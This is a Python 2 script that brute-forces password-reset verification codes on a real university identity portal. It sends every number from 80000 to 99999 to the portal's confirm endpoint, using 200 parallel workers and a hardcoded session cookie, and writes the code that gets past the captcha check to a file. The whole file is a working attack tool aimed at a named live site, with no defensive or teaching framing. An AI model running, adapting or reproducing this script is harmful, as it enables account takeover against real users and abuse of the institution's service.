import time
import json
import requests
from multiprocessing import Pool
import sys

founded = False
l = []
for i in range(80000, 99999, 1):
    l.append(str(i))

def send(code):
    cookies = {
        'laravel_session': 'eyJpdiI6IjkwelhxUlRQdk92QW5GUVZYZEExZ1E9PSIsInZhbHVlIjoialB2YVFGT25oMUJhN1NlXC9qRTN1UUdSQlhLZFRcL0dUU3p5clFyV1hjUXdDTkZtbXYwWGQyS1JjUGlzN3BQTXNOYVVIVno3UzZiMERHbVhJNUhwYSswUT09IiwibWFjIjoiY2Q1YTM0OTgxNmZhMTdlZTkzZTAwNjE0YjcwOTA2OWViMmZhNjA5N2YxNzk4ZmRhNDU2YjMxNzY3OWRhMjNjZSJ9',
    }

    headers = {
        'Pragma': 'no-cache',
        'Origin': 'https://utid.ut.ac.ir',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Cache-Control': 'no-cache',
        'Referer': 'https://utid.ut.ac.ir/user/p/forgot',
        'Connection': 'keep-alive',
        'Content-Length': '0',
    }

    data = [
      ('code', code),
    ]

    return requests.post('https://utid.ut.ac.ir/user/verifi/confirm', headers=headers, cookies=cookies, data=data)


def workerFunc( (start, step) ):
    global l
    global founded

    for i in range(start, len(l), step):
        if founded:
            exit(0);
            sys.exit();
            break;

        while True:
            try:
                if i % 100 == 0:
                    print "get", i, "->", l[i]

                r = send(l[i])
                if r.text.find('mycaptcha') == -1:
                    print("found!", l[i])
                    with open('found.txt', 'w') as f:
                        f.write(l[i])
                    founded = True

                break;
            except:
                print("error", l[i])
                time.sleep(10)

workers = 200
p = Pool( workers )
p.map(workerFunc, [ (start, workers) for start in range(workers) ])
